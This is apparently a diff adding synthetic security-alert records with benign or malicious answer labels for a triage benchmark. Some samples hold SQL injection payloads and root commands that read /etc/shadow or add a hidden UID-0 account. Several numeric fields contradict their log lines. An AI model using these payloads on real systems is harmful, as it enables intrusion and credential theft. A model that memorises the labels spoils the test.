+    "full_log": "dns: 10.0.10.25 queried cdn.example.com (first seen today)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "dns_known_good",
+      "rationale": "Domain is on the approved domain list."
+    }
+  },
+  {
+    "id": "N-045",
+    "timestamp": "2026-11-03T11:06:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "dstuser": "nreyes",
+      "hour_local": 10
+    },
+    "full_log": "useradd: new user: name=nreyes, UID=1864 (created by it_admin, ticket HR-8836)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "onboarding_new_user",
+      "rationale": "Admin creating a normal account in work hours with an HR ticket."
+    }
+  },
+  {
+    "id": "N-046",
+    "timestamp": "2026-11-06T02:37:00Z",
+    "rule": {
+      "id": "100210",
+      "level": 10,
+      "description": "DNS query to domain on threat-intel blocklist.",
+      "groups": [
+        "dns",
+        "threat_intel"
+      ]
+    },
+    "agent": {
+      "name": "ws-001",
+      "ip": "10.0.10.1"
+    },
+    "data": {
+      "query": "update-check.invalid-cdn.test",
+      "srcip": "10.0.10.1"
+    },
+    "full_log": "dns: 10.0.10.1 queried update-check.invalid-cdn.test (matched threat feed)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "dns_threat_intel",
+      "rationale": "Workstation contacted a domain on a threat-intelligence blocklist."
+    }
+  },
+  {
+    "id": "N-047",
+    "timestamp": "2026-11-04T17:02:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.28",
+      "srcuser": "lchen",
+      "failures_before_success": 63
+    },
+    "full_log": "sshd: Accepted password for lchen from 203.0.113.28 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-048",
+    "timestamp": "2026-11-02T16:53:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 227
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.5.50: 908 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-049",
+    "timestamp": "2026-11-05T03:59:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.233",
+      "url": "/products.php?id=1 UNION SELECT username,password FROM users--",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
+    },
+    "full_log": "198.51.100.233 - - \"GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-050",
+    "timestamp": "2026-11-03T18:06:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "package": "curl",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed curl (source updates.example.com, change ticket CHG-6153)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-051",
+    "timestamp": "2026-11-04T06:58:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 13147,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.4.40 -> 10.0.4.41 13147 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-052",
+    "timestamp": "2026-11-06T07:17:00Z",
+    "rule": {
+      "id": "550",
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "groups": [
+        "ossec",
+        "syscheck"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "file": "/var/www/html/index.php",
+      "changed_by": "it_admin"
+    },
+    "full_log": "syscheck: checksum changed /var/www/html/index.php by it_admin (deploy CHG-6268)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "planned_deploy",
+      "rationale": "Admin deploy with change ticket."
+    }
+  },
+  {
+    "id": "N-053",
+    "timestamp": "2026-11-02T23:34:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.173",
+      "url": "/images/logo2.png",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "203.0.113.173 - - \"GET /images/logo2.png HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-054",
+    "timestamp": "2026-11-05T20:01:00Z",
+    "rule": {
+      "id": "87105",
+      "level": 12,
+      "description": "VirusTotal: Alert - file detected as malicious by multiple engines.",
+      "groups": [
+        "virustotal"
+      ]
+    },
+    "agent": {
+      "name": "ws-040",
+      "ip": "10.0.10.40"
+    },
+    "data": {
+      "file": "C:\\Users\\hali\\Downloads\\setup_crack.exe",
+      "positives": 59,
+      "total": 70
+    },
+    "full_log": "VirusTotal: setup_crack.exe flagged by 53/70 engines",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "malware_download",
+      "rationale": "File flagged by many AV engines on a workstation."
+    }
+  },
+  {
+    "id": "N-055",
+    "timestamp": "2026-11-03T08:50:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcuser": "netops",
+      "command": "/usr/bin/apt update"
+    },
+    "full_log": "sudo: netops : TTY=pts/0 ; PWD=/home/netops ; USER=root ; COMMAND=/usr/bin/apt update",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-056",
+    "timestamp": "2026-11-03T00:09:00Z",
+    "rule": {
+      "id": "31101",
+      "level": 5,
+      "description": "Web server 400 error code.",
+      "groups": [
+        "web",
+        "accesslog"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "198.51.100.210",
+      "url": "/old-page.html",
+      "status": "404",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
+    },
+    "full_log": "198.51.100.210 - - \"GET /old-page.html HTTP/1.1\" 404",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "web_404",
+      "rationale": "Ordinary missing-page request from a normal browser."
+    }
+  },
+  {
+    "id": "N-057",
+    "timestamp": "2026-11-03T14:40:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "dstuser": "bjones",
+      "hour_local": 9
+    },
+    "full_log": "useradd: new user: name=bjones, UID=1215 (created by it_admin, ticket HR-4147)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "onboarding_new_user",
+      "rationale": "Admin creating a normal account in work hours with an HR ticket."
+    }
+  },
+  {
+    "id": "N-058",
+    "timestamp": "2026-11-05T01:06:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "198.51.100.48",
+      "url": "/products.php?q=';DROP TABLE orders;--",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
+    },
+    "full_log": "198.51.100.48 - - \"GET /products.php?q=';DROP TABLE orders;-- HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-059",
+    "timestamp": "2026-11-05T04:58:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.10",
+      "url": "/products.php?id=1' OR '1'='1",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "198.51.100.10 - - \"GET /products.php?id=1' OR '1'='1 HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-060",
+    "timestamp": "2026-11-03T17:52:00Z",
+    "rule": {
+      "id": "2902",
+      "level": 7,
+      "description": "New dpkg (Debian Package) installed.",
+      "groups": [
+        "syslog",
+        "dpkg",
+        "config_changed"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "package": "libc6",
+      "srcuser": "it_admin",
+      "source": "updates.example.com"
+    },
+    "full_log": "dpkg: status installed libc6 (source updates.example.com, change ticket CHG-3788)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "package_update",
+      "rationale": "Routine patch from the approved update domain with a change ticket."
+    }
+  },
+  {
+    "id": "N-061",
+    "timestamp": "2026-11-04T18:07:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.14",
+      "srcuser": "hali",
+      "failures_before_success": 28
+    },
+    "full_log": "sshd: Accepted password for hali from 203.0.113.14 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-062",
+    "timestamp": "2026-11-05T10:55:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcuser": "kpatel",
+      "command": "/bin/cat /etc/shadow"
+    },
+    "full_log": "sudo: kpatel : TTY=pts/1 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "suspicious_sudo",
+      "rationale": "Non-admin running a credential-theft or download-and-run command as root."
+    }
+  },
+  {
+    "id": "N-063",
+    "timestamp": "2026-11-06T02:10:00Z",
+    "rule": {
+      "id": "100210",
+      "level": 10,
+      "description": "DNS query to domain on threat-intel blocklist.",
+      "groups": [
+        "dns",
+        "threat_intel"
+      ]
+    },
+    "agent": {
+      "name": "ws-031",
+      "ip": "10.0.10.31"
+    },
+    "data": {
+      "query": "files-share.dl-mirror.test",
+      "srcip": "10.0.10.31"
+    },
+    "full_log": "dns: 10.0.10.31 queried files-share.dl-mirror.test (matched threat feed)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "dns_threat_intel",
+      "rationale": "Workstation contacted a domain on a threat-intelligence blocklist."
+    }
+  },
+  {
+    "id": "N-064",
+    "timestamp": "2026-11-03T11:49:00Z",
+    "rule": {
+      "id": "5902",
+      "level": 8,
+      "description": "New user added to the system.",
+      "groups": [
+        "syslog",
+        "adduser"
+      ]
+    },
+    "agent": {
+      "name": "dc-01",
+      "ip": "10.0.5.50"
+    },
+    "data": {
+      "srcuser": "it_admin",
+      "dstuser": "njones",
+      "hour_local": 9
+    },
+    "full_log": "useradd: new user: name=njones, UID=1154 (created by it_admin, ticket HR-5328)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "onboarding_new_user",
+      "rationale": "Admin creating a normal account in work hours with an HR ticket."
+    }
+  },
+  {
+    "id": "N-065",
+    "timestamp": "2026-11-02T18:04:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "10.0.9.10",
+      "ports_probed": 214
+    },
+    "full_log": "Port scan from 10.0.9.10 against 10.0.1.11: 977 ports in 60s",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "approved_scanner",
+      "rationale": "Source is the analyst-approved vulnerability scanner in allowlist.json."
+    }
+  },
+  {
+    "id": "N-066",
+    "timestamp": "2026-11-03T06:22:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcuser": "netops",
+      "command": "/usr/bin/systemctl restart nginx"
+    },
+    "full_log": "sudo: netops : TTY=pts/0 ; PWD=/home/netops ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-067",
+    "timestamp": "2026-11-04T21:25:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "198.51.100.156",
+      "ports_probed": 2947
+    },
+    "full_log": "Port scan from 198.51.100.156 against 10.0.3.30",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "external_scan",
+      "rationale": "Unknown external IP scanning a public server: reconnaissance."
+    }
+  },
+  {
+    "id": "N-068",
+    "timestamp": "2026-11-05T01:53:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.240",
+      "url": "/products.php?id=1' OR '1'='1",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "203.0.113.240 - - \"GET /products.php?id=1' OR '1'='1 HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-069",
+    "timestamp": "2026-11-02T11:38:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.10.17",
+      "srcuser": "rnguyen"
+    },
+    "full_log": "sshd[5769]: Failed password for rnguyen from 10.0.10.17 port 49228 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-070",
+    "timestamp": "2026-11-04T23:12:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.128",
+      "ports_probed": 933
+    },
+    "full_log": "Port scan from 203.0.113.128 against 10.0.1.11",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "external_scan",
+      "rationale": "Unknown external IP scanning a public server: reconnaissance."
+    }
+  },
+  {
+    "id": "N-071",
+    "timestamp": "2026-11-06T05:36:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcip": "10.0.2.20",
+      "dstip": "198.51.100.189",
+      "bytes_out_mb": 7534
+    },
+    "full_log": "netflow: 10.0.2.20 -> 198.51.100.189 7534 MB over 443 in 20 min",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "exfiltration",
+      "rationale": "Large transfer from a data server to an unknown external IP."
+    }
+  },
+  {
+    "id": "N-072",
+    "timestamp": "2026-11-03T06:51:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcuser": "netops",
+      "command": "/usr/bin/apt update"
+    },
+    "full_log": "sudo: netops : TTY=pts/0 ; PWD=/home/netops ; USER=root ; COMMAND=/usr/bin/apt update",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "admin_sudo",
+      "rationale": "Known admin running routine maintenance during work hours."
+    }
+  },
+  {
+    "id": "N-073",
+    "timestamp": "2026-11-05T04:14:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "203.0.113.32",
+      "url": "/products.php?id=1 UNION SELECT username,password FROM users--",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+    },
+    "full_log": "203.0.113.32 - - \"GET /products.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-074",
+    "timestamp": "2026-11-04T12:59:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "198.51.100.7",
+      "srcuser": "root",
+      "attempts": 300
+    },
+    "full_log": "sshd: 271 failed logins for invalid users from 198.51.100.7 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-075",
+    "timestamp": "2026-11-03T20:11:00Z",
+    "rule": {
+      "id": "100211",
+      "level": 3,
+      "description": "DNS query to newly observed domain.",
+      "groups": [
+        "dns"
+      ]
+    },
+    "agent": {
+      "name": "ws-018",
+      "ip": "10.0.10.18"
+    },
+    "data": {
+      "query": "cdn.example.com",
+      "srcip": "10.0.10.18"
+    },
+    "full_log": "dns: 10.0.10.18 queried cdn.example.com (first seen today)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "dns_known_good",
+      "rationale": "Domain is on the approved domain list."
+    }
+  },
+  {
+    "id": "N-076",
+    "timestamp": "2026-11-05T09:53:00Z",
+    "rule": {
+      "id": "5402",
+      "level": 3,
+      "description": "Successful sudo to ROOT executed.",
+      "groups": [
+        "syslog",
+        "sudo"
+      ]
+    },
+    "agent": {
+      "name": "db-01",
+      "ip": "10.0.2.20"
+    },
+    "data": {
+      "srcuser": "ekim",
+      "command": "/usr/sbin/useradd -o -u 0 sysupd"
+    },
+    "full_log": "sudo: ekim : TTY=pts/1 ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 sysupd",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "suspicious_sudo",
+      "rationale": "Non-admin running a credential-theft or download-and-run command as root."
+    }
+  },
+  {
+    "id": "N-077",
+    "timestamp": "2026-11-06T07:46:00Z",
+    "rule": {
+      "id": "550",
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "groups": [
+        "ossec",
+        "syscheck"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "file": "/var/www/html/index.php",
+      "changed_by": "it_admin"
+    },
+    "full_log": "syscheck: checksum changed /var/www/html/index.php by it_admin (deploy CHG-7631)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "planned_deploy",
+      "rationale": "Admin deploy with change ticket."
+    }
+  },
+  {
+    "id": "N-078",
+    "timestamp": "2026-11-04T09:11:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "web-02",
+      "ip": "10.0.1.11"
+    },
+    "data": {
+      "srcip": "198.51.100.38",
+      "srcuser": "ubuntu",
+      "attempts": 359
+    },
+    "full_log": "sshd: 253 failed logins for invalid users from 198.51.100.38 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-079",
+    "timestamp": "2026-11-04T20:20:00Z",
+    "rule": {
+      "id": "40112",
+      "level": 12,
+      "description": "Multiple authentication failures followed by a success.",
+      "groups": [
+        "syslog",
+        "authentication_success",
+        "attack"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "198.51.100.37",
+      "srcuser": "alee",
+      "failures_before_success": 79
+    },
+    "full_log": "sshd: Accepted password for alee from 198.51.100.37 after repeated failures",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "bruteforce_success",
+      "rationale": "External IP succeeded after many failures: likely compromised account."
+    }
+  },
+  {
+    "id": "N-080",
+    "timestamp": "2026-11-02T14:42:00Z",
+    "rule": {
+      "id": "5716",
+      "level": 5,
+      "description": "sshd: authentication failed.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "10.0.10.27",
+      "srcuser": "lchen"
+    },
+    "full_log": "sshd[1739]: Failed password for lchen from 10.0.10.27 port 61407 ssh2",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "single_failed_login",
+      "rationale": "One failed login from an internal workstation by a known employee; typo."
+    }
+  },
+  {
+    "id": "N-081",
+    "timestamp": "2026-11-04T07:10:00Z",
+    "rule": {
+      "id": "100300",
+      "level": 12,
+      "description": "Large outbound data transfer.",
+      "groups": [
+        "network",
+        "exfiltration"
+      ]
+    },
+    "agent": {
+      "name": "files-01",
+      "ip": "10.0.4.40"
+    },
+    "data": {
+      "srcip": "10.0.4.40",
+      "dstip": "10.0.4.41",
+      "bytes_out_mb": 17408,
+      "srcuser": "svc_backup"
+    },
+    "full_log": "netflow: 10.0.4.40 -> 10.0.4.41 17408 MB (svc_backup nightly job)",
+    "ground_truth": {
+      "label": "benign",
+      "scenario": "nightly_backup",
+      "rationale": "Transfer to the approved backup target by the backup service account."
+    }
+  },
+  {
+    "id": "N-082",
+    "timestamp": "2026-11-05T06:35:00Z",
+    "rule": {
+      "id": "31103",
+      "level": 7,
+      "description": "SQL injection attempt.",
+      "groups": [
+        "web",
+        "accesslog",
+        "attack",
+        "sql_injection"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "srcip": "203.0.113.105",
+      "url": "/products.php?q=';DROP TABLE orders;--",
+      "status": "200",
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
+    },
+    "full_log": "203.0.113.105 - - \"GET /products.php?q=';DROP TABLE orders;-- HTTP/1.1\" 200",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "sql_injection",
+      "rationale": "SQL injection payload in URL; 200 status means it may have worked."
+    }
+  },
+  {
+    "id": "N-083",
+    "timestamp": "2026-11-06T08:32:00Z",
+    "rule": {
+      "id": "554",
+      "level": 7,
+      "description": "File added to the system.",
+      "groups": [
+        "ossec",
+        "syscheck"
+      ]
+    },
+    "agent": {
+      "name": "web-01",
+      "ip": "10.0.1.10"
+    },
+    "data": {
+      "file": "/var/www/html/upload/shell.php",
+      "changed_by": "www-data"
+    },
+    "full_log": "syscheck: new file /var/www/html/upload/shell.php by www-data",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "webshell_upload",
+      "rationale": "Web user dropped a PHP file in an upload folder: likely web shell."
+    }
+  },
+  {
+    "id": "N-084",
+    "timestamp": "2026-11-05T20:50:00Z",
+    "rule": {
+      "id": "87105",
+      "level": 12,
+      "description": "VirusTotal: Alert - file detected as malicious by multiple engines.",
+      "groups": [
+        "virustotal"
+      ]
+    },
+    "agent": {
+      "name": "ws-040",
+      "ip": "10.0.10.40"
+    },
+    "data": {
+      "file": "C:\\Users\\sowusu\\Downloads\\invoice_2026.pdf.exe",
+      "positives": 36,
+      "total": 70
+    },
+    "full_log": "VirusTotal: invoice_2026.pdf.exe flagged by 51/70 engines",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "malware_download",
+      "rationale": "File flagged by many AV engines on a workstation."
+    }
+  },
+  {
+    "id": "N-085",
+    "timestamp": "2026-11-06T02:44:00Z",
+    "rule": {
+      "id": "100210",
+      "level": 10,
+      "description": "DNS query to domain on threat-intel blocklist.",
+      "groups": [
+        "dns",
+        "threat_intel"
+      ]
+    },
+    "agent": {
+      "name": "ws-021",
+      "ip": "10.0.10.21"
+    },
+    "data": {
+      "query": "files-share.dl-mirror.test",
+      "srcip": "10.0.10.21"
+    },
+    "full_log": "dns: 10.0.10.21 queried files-share.dl-mirror.test (matched threat feed)",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "dns_threat_intel",
+      "rationale": "Workstation contacted a domain on a threat-intelligence blocklist."
+    }
+  },
+  {
+    "id": "N-086",
+    "timestamp": "2026-11-04T14:25:00Z",
+    "rule": {
+      "id": "5712",
+      "level": 10,
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_failures"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
+      "ip": "10.0.3.30"
+    },
+    "data": {
+      "srcip": "198.51.100.124",
+      "srcuser": "oracle",
+      "attempts": 354
+    },
+    "full_log": "sshd: 165 failed logins for invalid users from 198.51.100.124 within 120s",
+    "ground_truth": {
+      "label": "malicious",
+      "scenario": "ssh_bruteforce_external",
+      "rationale": "Many failed logins for non-existent users from an external IP."
+    }
+  },
+  {
+    "id": "N-087",
+    "timestamp": "2026-11-04T22:45:00Z",
+    "rule": {
+      "id": "40101",
+      "level": 8,
+      "description": "Port scan detected.",
+      "groups": [
+        "firewall",
+        "recon"
+      ]
+    },
+    "agent": {
+      "name": "mail-01",
